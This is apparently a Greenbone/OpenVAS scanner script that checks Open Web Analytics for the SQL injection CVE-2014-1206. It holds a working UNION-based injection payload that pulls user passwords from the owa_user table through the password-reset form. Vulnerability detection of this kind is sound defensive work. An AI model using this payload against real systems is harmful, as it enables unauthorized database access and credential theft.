CPE = "cpe:/a:openwebanalytics:open_web_analytics";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803795" );
	script_version( "2019-12-05T15:10:00+0000" );
	script_cve_id( "CVE-2014-1206" );
	script_bugtraq_id( 64774 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2019-12-05 15:10:00 +0000 (Thu, 05 Dec 2019)" );
	script_tag( name: "creation_date", value: "2014-01-21 13:34:38 +0530 (Tue, 21 Jan 2014)" );
	script_name( "Open Web Analytics 'owa_email_address' SQL Injection Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with Open Web Analytics and is prone to sql injection
  vulnerabilities." );
	script_tag( name: "vuldetect", value: "Get the installed location with the help of detect NVT and check sql injection
  is possible." );
	script_tag( name: "insight", value: "Input passed via the 'owa_email_address' parameter to index.php
  (when 'owa_do' is set to 'base.passwordResetForm' and 'owa_action' is set to 'base.passwordResetRequest')
  is not properly sanitised before being used in a SQL query." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to manipulate SQL queries
  in the back-end database, allowing for the manipulation or disclosure of arbitrary data." );
	script_tag( name: "affected", value: "Open Web Analytics version 1.5.4 and prior." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "solution", value: "Upgrade to Open Web Analytics 1.5.5 or later." );
	script_xref( name: "URL", value: "http://secunia.com/advisories/56350" );
	script_xref( name: "URL", value: "http://www.secureworks.com/advisories/SWRX-2014-001/SWRX-2014-001.pdf" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_open_web_analytics_detect.sc" );
	script_mandatory_keys( "OpenWebAnalytics/installed" );
	script_require_ports( "Services/www", 80 );
	script_xref( name: "URL", value: "http://downloads.openwebanalytics.com" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
owaPort = get_app_port( cpe: CPE );
if(!owaPort){
	exit( 0 );
}
host = http_host_name( port: owaPort );
if(!dir = get_app_location( cpe: CPE, port: owaPort )){
	exit( 0 );
}
postdata = "owa_submit=Request+New+Password&owa_action=base.password" + "ResetRequest&owa_email_address=-4534' UNION ALL SELECT 3" + "627,3627,3627,3627,3627,CONCAT(0x7177766871,0x73716c2d69" + "6e6a2d74657374, IFNULL(CAST(password AS CHAR),0x20),0x71" + "76627971),3627,3627,3627,3627 FROM owa.owa_user LIMIT 0,1#";
owaReq = NASLString( "POST ", dir, "/index.php?owa_do=base.passwordResetForm HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postdata ), "\\r\\n\\r\\n", postdata );
owaRes = http_keepalive_send_recv( port: owaPort, data: owaReq );
if(owaRes && IsMatchRegexp( owaRes, "Invalid address:.*sql-inj-test" )){
	security_message( owaPort );
	exit( 0 );
}

